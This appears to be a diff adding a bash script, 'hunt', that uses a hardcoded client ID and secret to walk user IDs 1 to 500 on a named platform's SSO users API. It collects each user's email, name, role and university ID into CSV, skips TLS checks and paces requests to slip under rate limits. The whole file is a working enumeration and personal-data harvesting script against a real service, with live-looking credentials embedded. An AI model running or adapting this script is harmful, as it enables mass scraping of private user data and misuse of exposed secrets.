+/hunt #!/bin/bash
+
+export CLIENT_ID="73c8faac-1548-43ad-92cb-7690e121fd8e"
+export CLIENT_SECRET="7901feb1d719421aa1fcb0f7cbdf43d8"
+
+# Configuration
+CLIENT_ID="${CLIENT_ID:-}"
+CLIENT_SECRET="${CLIENT_SECRET:-}"
+BASE_URL="https://sso.ssc.sevimaplatform.com/api/v1/users"
+START_ID=1
+END_ID=500
+DELAY=0.1  # seconds between requests to avoid rate limiting
+
+if [ -z "$CLIENT_ID" ] || [ -z "$CLIENT_SECRET" ]; then
+    echo "Error: CLIENT_ID and CLIENT_SECRET must be set."
+    exit 1
+fi
+
+echo "ID,Email,Name,Role,UniversityId"
+for id in $(seq $START_ID $END_ID); do
+    resp=$(curl -sk "${BASE_URL}/${id}" \
+        -H "Client-Id: ${CLIENT_ID}" \
+        -H "Client-Secret: ${CLIENT_SECRET}" 2>/dev/null)
+
+    # Check if response is valid JSON
+    if echo "$resp" | jq -e . >/dev/null 2>&1; then
+        # Extract fields, default to "null" if missing
+        email=$(echo "$resp" | jq -r '.data.attributes.email // "null"')
+        name=$(echo "$resp" | jq -r '.data.attributes.name // "null"')
+        role=$(echo "$resp" | jq -r '.data.attributes.role // "null"')
+        uniId=$(echo "$resp" | jq -r '.data.attributes.universityId // "null"')
+        echo "${id},${email},${name},${role},${uniId}"
+    else
+        # If response is not JSON, likely user not found or error
+        echo "${id},ERROR,ERROR,ERROR,ERROR"
+    fi
+
+    sleep $DELAY
+done

